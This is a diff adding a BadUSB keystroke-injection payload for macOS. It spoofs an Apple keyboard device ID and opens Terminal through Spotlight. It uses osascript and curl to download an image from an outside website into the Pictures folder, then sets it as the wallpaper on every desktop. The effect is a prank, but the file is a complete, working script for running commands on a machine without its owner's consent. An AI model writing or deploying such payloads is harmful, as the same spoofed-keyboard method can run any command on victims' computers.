@@ -1,0 +1,33 @@
+ID 05ac:0281 Apple:Keyboard
+
+DELAY 500
+GUI SPACE
+DELAY 500
+ENTER
+DELAY 300
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 500
+STRING osascript -e 'do shell script "curl https://www.unavoceperpadrepio.com/wp-content/uploads/2019/05/immagine-Padre-Pio-370x370.png -o
+SPACE
+ALT 5
+STRING /Pictures/ciao.png"'
+ENTER
+DELAY 1500
+ENTER
+DELAY 500
+GUI SPACE
+DELAY 500
+ENTER
+DELAY 300
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 500
+STRING osascript -e 'tell application "System Events" to tell every desktop to set picture to "
+ALT 5
+STRING /Pictures/ciao.png"'
+ENTER
+DELAY 1500
+ENTER
